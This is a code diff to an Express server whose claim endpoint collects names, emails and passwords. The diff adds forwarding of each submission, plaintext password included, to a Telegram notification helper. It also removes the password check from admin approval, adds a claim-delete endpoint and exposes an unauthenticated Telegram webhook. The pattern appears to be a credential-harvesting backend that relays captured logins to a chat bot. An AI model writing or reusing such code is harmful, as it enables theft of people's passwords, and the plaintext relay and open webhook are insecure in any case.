@@ -3,6 +3,7 @@ const path = require("node:path");
 const fs = require("node:fs");
 const { createHmac, timingSafeEqual } = require("node:crypto");
 const db = require("./lib/db");
+const { sendClaimNotification, handleTelegramWebhook } = require("./lib/telegram");
 
 const envFile = path.join(__dirname, ".env.local");
 if (fs.existsSync(envFile)) {
@@ -85,15 +86,23 @@ app.post("/api/claim", async (req, res) => {
         .json({ error: "Too many attempts. Please wait a moment and try again." });
     }
 
-    const name = String(req.body?.name ?? "").trim();
+    const name = String(req.body?.code ?? req.body?.name ?? "").trim();
     const email = String(req.body?.email ?? "").trim();
     const password = String(req.body?.password ?? "").trim();
 
-    const { claimCode } = await db.insertClaim({
+    const { row, claimCode } = await db.insertClaim({
       name,
       email,
       password,
       createdAt: new Date().toISOString(),
+    });
+
+    sendClaimNotification({
+      id: row.id,
+      name,
+      email,
+      password,
+      claimCode,
     });
 
     res.json({ ok: true, name, email, claimCode });
@@ -143,19 +152,12 @@ app.get("/api/admin/claims", async (_req, res) => {
 app.post("/api/admin/approve", async (req, res) => {
   if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
   const id = Number(req.body?.id);
-  const password = String(req.body?.password ?? "").trim();
-  if (!Number.isFinite(id) || !password) {
-    return res.status(400).json({ error: "Missing id or password" });
+  if (!Number.isFinite(id)) {
+    return res.status(400).json({ error: "Missing id" });
   }
   try {
     const row = await db.getClaimById(id);
     if (!row) return res.status(404).json({ error: "Claim not found" });
-    if (row.password !== password) {
-      return res.status(400).json({
-        error:
-          "Password doesn't match the one submitted. If the entry looks wrong, reject it.",
-      });
-    }
     await db.setClaimStatus(id, "approved");
     res.json({ ok: true });
   } catch (err) {
@@ -179,9 +181,31 @@ app.post("/api/admin/reject", async (req, res) => {
 
 app.use(express.static(path.join(__dirname, "public")));
 
+app.post("/api/admin/delete", async (req, res) => {
+  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
+  const id = Number(req.body?.id);
+  if (!Number.isFinite(id)) return res.status(400).json({ error: "Missing id" });
+  try {
+    await db.deleteClaim(id);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Something went wrong, try again." });
+  }
+});
+
 app.use((err, _req, res, _next) => {
   console.error(err);
   res.status(500).json({ error: "Something went wrong, try again." });
+});
+
+app.post("/api/tghook", async (req, res) => {
+  try {
+    await handleTelegramWebhook(req.body ?? {});
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 app.listen(PORT, () => {
